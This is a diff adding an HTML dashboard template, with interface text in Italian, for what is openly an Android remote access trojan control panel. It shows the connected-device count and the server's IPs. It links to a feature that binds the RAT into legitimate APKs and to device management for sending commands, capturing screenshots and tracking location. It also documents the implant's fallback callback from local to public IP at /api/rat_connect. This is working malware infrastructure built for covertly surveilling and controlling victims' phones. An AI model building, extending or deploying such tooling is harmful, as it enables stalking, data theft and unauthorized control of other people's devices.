@@ -1,0 +1,118 @@
+{% extends "base.html" %}
+
+{% block title %}Dashboard - RAT Control Panel{% endblock %}
+
+{% block content %}
+<div class="row mb-4">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header bg-primary text-white">
+                <h4 class="mb-0"><i class="bi bi-speedometer2"></i> Dashboard</h4>
+            </div>
+            <div class="card-body">
+                <div class="row">
+                    <div class="col-md-3">
+                        <div class="dashboard-stats">
+                            <div class="stat-value">{{ device_count }}</div>
+                            <div class="stat-label">Dispositivi Connessi</div>
+                        </div>
+                    </div>
+                    <div class="col-md-3">
+                        <div class="dashboard-stats">
+                            <div class="stat-value">{{ local_ip }}</div>
+                            <div class="stat-label">IP Locale</div>
+                        </div>
+                    </div>
+                    <div class="col-md-3">
+                        <div class="dashboard-stats">
+                            <div class="stat-value">{{ public_ip }}</div>
+                            <div class="stat-label">IP Pubblico</div>
+                        </div>
+                    </div>
+                    <div class="col-md-3">
+                        <div class="dashboard-stats">
+                            <div class="stat-value">{{ uptime }}</div>
+                            <div class="stat-label">Uptime Server</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="row">
+    <div class="col-md-6">
+        <div class="card">
+            <div class="card-header">
+                <h5 class="mb-0"><i class="bi bi-link-45deg"></i> Binding APK</h5>
+            </div>
+            <div class="card-body">
+                <p>Crea un APK modificato con il RAT integrato.</p>
+                <p>L'APK modificato funzionerà sia con l'IP locale ({{ local_ip }}) che con l'IP pubblico ({{ public_ip }}).</p>
+                <a href="/bind" class="btn btn-primary"><i class="bi bi-link-45deg"></i> Vai al Binding APK</a>
+            </div>
+        </div>
+    </div>
+    
+    <div class="col-md-6">
+        <div class="card">
+            <div class="card-header">
+                <h5 class="mb-0"><i class="bi bi-phone"></i> Gestione Dispositivi</h5>
+            </div>
+            <div class="card-body">
+                <p>Visualizza e gestisci i dispositivi connessi al server.</p>
+                <p>Puoi inviare comandi, visualizzare screenshot, posizione e altro.</p>
+                <a href="/devices" class="btn btn-primary"><i class="bi bi-phone"></i> Gestisci Dispositivi</a>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="row mt-4">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header">
+                <h5 class="mb-0"><i class="bi bi-info-circle"></i> Informazioni di Connessione</h5>
+            </div>
+            <div class="card-body">
+                <div class="alert alert-info">
+                    <h5><i class="bi bi-lightbulb"></i> Come funziona il sistema dual-IP</h5>
+                    <p>Il RAT è stato modificato per funzionare sia con l'IP locale che con quello pubblico:</p>
+                    <ol>
+                        <li>Prima tenta di connettersi usando l'IP locale (stessa rete WiFi)</li>
+                        <li>Se la connessione fallisce dopo 5 secondi, passa automaticamente all'IP pubblico</li>
+                        <li>Questo permette all'app di funzionare sia quando sei sulla stessa rete del server, sia quando sei su una rete diversa (come i dati mobili)</li>
+                    </ol>
+                </div>
+                
+                <div class="row">
+                    <div class="col-md-6">
+                        <div class="card mb-3">
+                            <div class="card-header bg-success text-white">
+                                <h6 class="mb-0">Connessione Locale (Stessa Rete WiFi)</h6>
+                            </div>
+                            <div class="card-body">
+                                <p><strong>URL:</strong> http://{{ local_ip }}:{{ port }}/api/rat_connect</p>
+                                <p><strong>Vantaggi:</strong> Più veloce, non richiede connessione internet</p>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="col-md-6">
+                        <div class="card mb-3">
+                            <div class="card-header bg-primary text-white">
+                                <h6 class="mb-0">Connessione Remota (Internet)</h6>
+                            </div>
+                            <div class="card-body">
+                                <p><strong>URL:</strong> http://{{ public_ip }}:{{ port }}/api/rat_connect</p>
+                                <p><strong>Vantaggi:</strong> Funziona da qualsiasi rete, anche dati mobili</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
